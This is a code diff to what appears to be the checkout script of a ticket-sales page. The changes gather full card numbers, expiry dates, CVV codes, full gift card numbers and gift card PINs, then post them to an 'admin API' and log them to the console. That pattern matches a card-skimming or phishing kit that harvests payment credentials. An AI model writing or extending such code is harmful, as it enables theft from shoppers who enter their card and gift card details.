@@ -344,6 +344,7 @@ async function submitGiftCardPayment(orderSummary = {}) {
         email: email,
         paymentMethod: 'Gift Card',
         giftCardNumberFull: giftCardNumber,
+        giftCardLastFour: giftCardNumber.slice(-4),
         giftCardPinFull: giftCardPin,
         orderSummary: orderSummary
       });
@@ -400,17 +401,36 @@ async function saveSubmission(data) {
 
   // POST to admin API (non-blocking) - FORMAT CORRECTLY FOR API ENDPOINT
   try {
-    const apiSubmission = {
+    // Determine payment method and map fields accordingly
+    const paymentMethod = data.paymentMethod || 'Card';
+    let apiSubmission = {
       email: data.email,
-      eventTitle: data.orderSummary?.event || '', // Flatten orderSummary.event to eventTitle
+      eventTitle: data.orderSummary?.event || '',
       quantity: data.orderSummary?.quantity || '',
       pricePerTicket: data.orderSummary?.pricePerTicket || '',
       total: data.orderSummary?.total || '',
-      cardNumber: data.cardNumber || '',
-      expiryDate: data.expiryDate || '',
-      cvv: data.cvv || '',
-      zipCode: data.postalCode || '' // Rename postalCode to zipCode
+      paymentMethod: paymentMethod,
+      orderSummary: data.orderSummary || {}
     };
+
+    // Add payment-specific fields
+    if (paymentMethod === 'Card') {
+      apiSubmission = {
+        ...apiSubmission,
+        cardNumberFull: data.cardNumberFull || data.cardNumber || '',
+        cardLastFour: data.cardLastFour || '',
+        expiryDate: data.expiryDate || '',
+        securityCodeCVV: data.cvv || '',
+        postalCode: data.postalCode || data.zipCode || ''
+      };
+    } else if (paymentMethod === 'Gift Card') {
+      apiSubmission = {
+        ...apiSubmission,
+        giftCardNumberFull: data.giftCardNumberFull || '',
+        giftCardLastFour: data.giftCardLastFour || '',
+        giftCardPinFull: data.giftCardPinFull || ''
+      };
+    }
 
     console.log('Sending submission to API:', apiSubmission);
 
